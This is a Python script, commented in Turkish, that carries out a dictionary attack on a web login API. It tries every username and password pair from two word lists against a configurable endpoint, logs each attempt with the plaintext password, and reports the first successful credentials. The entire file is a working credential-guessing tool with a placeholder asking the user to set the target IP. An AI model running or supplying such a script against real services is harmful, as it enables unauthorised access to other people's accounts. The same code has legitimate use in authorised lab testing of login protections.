import requests
import time
import json
from datetime import datetime
import os

# Hedef login API endpoint'i
URL = "http://127.0.0.1:5000/api/login"  # Burayı hedef IP ile değiştir
USERNAME_FILE = "usernames.txt"           # Kullanıcı adı listesi
PASSWORD_FILE = "passwords.txt"           # Şifre listesi
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "dictionary_attack_logs.jsonl")
DELAY = 0.5  # Her denemeden sonra bekleme süresi(flood olmasın diye)

# Giriş denemesi yapan fonksiyon
def attempt_login(username, password):
    try:
        response = requests.post(URL, json={"username": username, "password": password})
        if response.status_code == 200 and response.json().get("success"):
            return True
    except Exception as e:
        print(f" Bağlantı hatası: {e}")
    return False

# Log kaydı
def log_attempt(username, password, success):
    log_entry = {
        "time": datetime.now().isoformat(),
        "username": username,
        "password": password,
        "success": success
    }
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(log_entry) + "\n")

# Ana saldırı fonksiyonu
def main():
    print(" Username + Password dictionary attack başlatılıyor...")

    found = False

    try:
        with open(USERNAME_FILE, "r", encoding="utf-8", errors="ignore") as uf:
            usernames = [line.strip() for line in uf if line.strip()]

        with open(PASSWORD_FILE, "r", encoding="utf-8", errors="ignore") as pf:
            passwords = [line.strip() for line in pf if line.strip()]

    except FileNotFoundError as e:
        print(f" Dosya hatası: {e}")
        return

    for username in usernames:
        for password in passwords:
            print(f" Deneniyor -> {username}:{password}")
            success = attempt_login(username, password)
            log_attempt(username, password, success)

            if success:
                print(f" Doğru giriş bulundu! Username: {username}, Password: {password}")
                found = True
                return  # İstenirse burada durabiliriz

            time.sleep(DELAY)

    if not found:
        print(" Hiçbir doğru kullanıcı adı / şifre kombinasyonu bulunamadı.")

if __name__ == "__main__":
    main()
